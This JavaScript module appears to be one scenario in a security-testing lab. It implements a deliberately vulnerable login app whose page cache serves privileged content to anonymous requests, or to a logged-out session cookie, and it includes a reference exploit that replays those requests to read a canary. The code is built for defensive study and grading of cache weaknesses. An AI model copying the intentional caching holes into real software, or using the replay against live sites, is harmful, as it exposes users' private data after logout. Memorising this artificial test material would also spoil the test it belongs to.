// WSTG-ATHN-06 (4.4.6) — Browser / shared-cache weakness.
//
// In-memory state. Single deploy instance, transient.
//
// Flow (intended):
//   POST signupPath  { identifier, password }   -> creates an account
//   POST loginPath   { identifier, password }   -> mints session cookie,
//                                                   302 -> privilegedPath
//   GET  privilegedPath + valid session         -> canary (and populates
//                                                   the page cache as a
//                                                   side-effect)
//   GET  logoutPath  + cookie                   -> invalidates the session,
//                                                   clears the cookie
//   GET  privilegedPath + no session            -> "please sign in" body
//
// Bug:
//   T0 — the page cache fronts privilegedPath and keys solely on the
//        URL path. Once any authenticated GET populates the entry, every
//        subsequent GET to that URL — anonymous or otherwise — gets the
//        cached privileged body, canary included.
//
//   T1 — the cache keys on (path, cookieValue). Anonymous GETs miss the
//        index. But entries never age out by session lifetime: the cache
//        keeps returning the cached payload to any request whose cookie
//        value matches the value that was active at populate time, even
//        after that session has been logged out and invalidated
//        server-side. The bypass: capture the session cookie value while
//        authenticated, log out (which invalidates the server-side
//        session but does not evict the cache row), then replay the
//        captured cookie value against privilegedPath — the cache layer
//        sees a (path, cookieValue) match and serves the stale canary.

import crypto from 'node:crypto'
import { Scenario } from './scenario.mjs'

function hashPassword(pw) {
  return crypto.createHash('sha256').update(pw).digest('hex')
}

const accounts = new Map()  // identifier -> { passwordHash }
const sessions = new Map()  // sid -> { identifier, active }

// Page cache: pathname -> { body, cookieValue }
// cookieValue is the session cookie value that was active when the
// entry was populated. T0 ignores it; T1 keys on it.
const pageCache = new Map()

function newSessionId() { return 'sid_' + crypto.randomBytes(12).toString('hex') }

function readCookie(req, name) {
  const c = String(req.headers.cookie || '').split(';').map(s => s.trim())
    .find(s => s.startsWith(name + '='))
  return c ? c.slice(name.length + 1) : null
}

function escapeHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
}
function escapeAttr(s) { return escapeHtml(s) }

function renderSignupForm(scenario, msg = '') {
  const err = msg ? `<p style="color:#b00;margin:0 0 12px;font-size:13px">${escapeHtml(msg)}</p>` : ''
  return `<form method="POST" action="${escapeAttr(scenario.signupPath)}"
      style="display:flex;flex-direction:column;gap:12px;max-width:380px">
    ${err}
    <label style="display:flex;flex-direction:column;gap:4px">
      <span style="font-size:13px">Identifier</span>
      <input type="text" name="identifier" required autocomplete="username"
        style="padding:9px 12px;border:1px solid #c8c8c8;border-radius:6px;font-size:14px">
    </label>
    <label style="display:flex;flex-direction:column;gap:4px">
      <span style="font-size:13px">Password</span>
      <input type="password" name="password" required autocomplete="new-password"
        style="padding:9px 12px;border:1px solid #c8c8c8;border-radius:6px;font-size:14px">
    </label>
    <button type="submit" style="padding:10px 14px;background:#1c1917;color:white;border:0;border-radius:6px;font-size:14px;cursor:pointer">Create account</button>
  </form>`
}

function renderLoginForm(scenario, msg = '') {
  const err = msg ? `<p style="color:#b00;margin:0 0 12px;font-size:13px">${escapeHtml(msg)}</p>` : ''
  return `<form method="POST" action="${escapeAttr(scenario.loginPath)}"
      style="display:flex;flex-direction:column;gap:12px;max-width:380px">
    ${err}
    <label style="display:flex;flex-direction:column;gap:4px">
      <span style="font-size:13px">Identifier</span>
      <input type="text" name="identifier" required autocomplete="username"
        style="padding:9px 12px;border:1px solid #c8c8c8;border-radius:6px;font-size:14px">
    </label>
    <label style="display:flex;flex-direction:column;gap:4px">
      <span style="font-size:13px">Password</span>
      <input type="password" name="password" required autocomplete="current-password"
        style="padding:9px 12px;border:1px solid #c8c8c8;border-radius:6px;font-size:14px">
    </label>
    <button type="submit" style="padding:10px 14px;background:#1c1917;color:white;border:0;border-radius:6px;font-size:14px;cursor:pointer">Sign in</button>
  </form>`
}

function parseForm(rawBody) {
  return new URLSearchParams(rawBody || '')
}

export const classDef = {
  wstgId: 'WSTG-ATHN-06',
  class: 'Browser Cache Weaknesses',
  defenceTiers: [0, 1],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.loginPath,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.loginPath),

  matchesRequest({ reqUrl, req, scenario }) {
    const p = reqUrl.pathname
    const m = req.method
    if (p === scenario.signupPath && (m === 'GET' || m === 'POST')) return true
    if (p === scenario.loginPath && (m === 'GET' || m === 'POST')) return true
    if (p === scenario.logoutPath && (m === 'GET' || m === 'POST')) return true
    if (p === scenario.privilegedPath && m === 'GET') return true
    return false
  },

  async handleRequest({ req, reqUrl, scenario, helpers, renderPage, manifest }) {
    const p = reqUrl.pathname
    const tier = manifest.defenceTier || 0

    // Signup
    if (p === scenario.signupPath) {
      if (req.method === 'GET') {
        return { status: 200, body: renderPage(scenario.signupFormBody.replace('{FORM}', renderSignupForm(scenario))) }
      }
      const form = parseForm(helpers.rawBody)
      const identifier = (form.get('identifier') || '').trim()
      const password = form.get('password') || ''
      if (!identifier || !password) {
        return { status: 400, body: renderPage(scenario.signupFormBody.replace('{FORM}', renderSignupForm(scenario, 'Identifier and password required.'))) }
      }
      if (accounts.has(identifier)) {
        return { status: 409, body: renderPage(scenario.signupFormBody.replace('{FORM}', renderSignupForm(scenario, 'Identifier already in use.'))) }
      }
      accounts.set(identifier, { passwordHash: hashPassword(password) })
      return { status: 302, headers: { Location: scenario.loginPath }, body: '' }
    }

    // Login
    if (p === scenario.loginPath) {
      if (req.method === 'GET') {
        return { status: 200, body: renderPage(scenario.loginFormBody.replace('{FORM}', renderLoginForm(scenario))) }
      }
      const form = parseForm(helpers.rawBody)
      const identifier = (form.get('identifier') || '').trim()
      const password = form.get('password') || ''
      const acc = accounts.get(identifier)
      if (!acc || acc.passwordHash !== hashPassword(password)) {
        return { status: 401, body: renderPage(scenario.loginFormBody.replace('{FORM}', renderLoginForm(scenario, 'Invalid credentials.'))) }
      }
      const sid = newSessionId()
      sessions.set(sid, { identifier, active: true })
      return {
        status: 302,
        headers: {
          Location: scenario.privilegedPath,
          'Set-Cookie': `${scenario.sessionCookieName}=${sid}; Path=/; HttpOnly; SameSite=Lax`,
        },
        body: '',
      }
    }

    // Logout. Invalidates the server-side session and clears the cookie.
    // Critically: does NOT evict the cache entry — the canonical bug at
    // T1, where the cache continues to serve the stale payload to anyone
    // who can present the cookie value that was active at populate time.
    if (p === scenario.logoutPath) {
      const sid = readCookie(req, scenario.sessionCookieName)
      if (sid && sessions.has(sid)) {
        sessions.get(sid).active = false
      }
      return {
        status: 302,
        headers: {
          Location: scenario.loginPath,
          'Set-Cookie': `${scenario.sessionCookieName}=; Path=/; Max-Age=0`,
        },
        body: '',
      }
    }

    // Privileged area, fronted by the page cache.
    if (p === scenario.privilegedPath && req.method === 'GET') {
      const sid = readCookie(req, scenario.sessionCookieName)
      const cookieValue = sid || ''

      // Cache lookup — keying differs per tier.
      const cached = pageCache.get(p)
      if (cached) {
        if (tier >= 1) {
          // T1: serve only when the supplied cookie value matches the
          // value that populated the entry. The cache row never ages out
          // by session lifetime — a captured-then-logged-out cookie
          // value still matches.
          if (cookieValue && cookieValue === cached.cookieValue) {
            return { status: 200, body: cached.body }
          }
        } else {
          // T0: key on path alone. Any requester wins.
          return { status: 200, body: cached.body }
        }
      }

      // Cache miss. Generate the response from origin logic.
      const sess = sid ? sessions.get(sid) : null
      if (!sess || !sess.active) {
        // Anonymous / revoked sessions get the public sign-in body. NOT
        // cached — only the privileged variant populates the cache.
        return { status: 200, body: renderPage(scenario.loggedOutBody) }
      }

      const body = renderPage(
        scenario.privilegedBody
          .replaceAll('{CANARY}', manifest.perDeployCanary)
          .replaceAll('{USER}', escapeHtml(sess.identifier))
      )

      // Populate the cache. The bug is right here: the entry stores the
      // privileged variant without binding to session liveness. T0
      // ignores cookieValue at read time entirely; T1 binds the read to
      // cookieValue, but the bound value persists past session revocation.
      pageCache.set(p, { body, cookieValue })
      return { status: 200, body }
    }

    return { status: 404, body: renderPage('<p>Not found.</p>') }
  },

  // Reference exploit. Signs up, logs in, visits the privileged page
  // (populating the cache with the canary), logs out, then attempts the
  // cache replay.
  //
  // Payload selector:
  //   t0-anonymous-replay    — anonymous GET to privilegedPath after
  //                            cache populate (T0 canonical)
  //   t1-captured-cookie     — GET to privilegedPath carrying the
  //                            captured (now-invalid) session cookie
  //                            value (T1 bypass)
  async fireExploit({ baseUrl, scenario, payload }) {
    const ident = 'tester-' + Math.random().toString(36).slice(2, 8) + '@example.test'
    const pw = 'Probe!' + crypto.randomBytes(4).toString('hex')

    // Signup
    const su = await fetch(`${baseUrl}${scenario.signupPath}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `identifier=${encodeURIComponent(ident)}&password=${encodeURIComponent(pw)}`,
      redirect: 'manual',
    })
    if (su.status !== 302) return { status: su.status, body: '(signup failed)' }

    // Login
    const li = await fetch(`${baseUrl}${scenario.loginPath}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `identifier=${encodeURIComponent(ident)}&password=${encodeURIComponent(pw)}`,
      redirect: 'manual',
    })
    if (li.status !== 302) return { status: li.status, body: '(login failed)' }
    const setCookie = li.headers.get('set-cookie') || ''
    const m = setCookie.match(new RegExp(`${scenario.sessionCookieName}=([^;]+)`))
    if (!m) return { status: li.status, body: '(no session cookie minted)' }
    const cookieValue = m[1]
    const cookieHeader = `${scenario.sessionCookieName}=${cookieValue}`

    // Populate the cache: one authenticated GET to the privileged path.
    const warm = await fetch(`${baseUrl}${scenario.privilegedPath}`, {
      headers: { Cookie: cookieHeader },
    })
    if (warm.status !== 200) return { status: warm.status, body: '(warm-up failed)' }

    // Log out. Server-side session goes inactive; the cache entry stays.
    await fetch(`${baseUrl}${scenario.logoutPath}`, {
      headers: { Cookie: cookieHeader },
      redirect: 'manual',
    })

    // Replay.
    const replayHeaders = {}
    if (payload === 't1-captured-cookie') {
      replayHeaders.Cookie = cookieHeader
    }
    const r = await fetch(`${baseUrl}${scenario.privilegedPath}`, { headers: replayHeaders })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    typeof responseBody === 'string' && responseBody.includes(perDeployCanary),
}

export const __test = {
  resetState: () => { accounts.clear(); sessions.clear(); pageCache.clear() },
  accounts, sessions, pageCache,
}
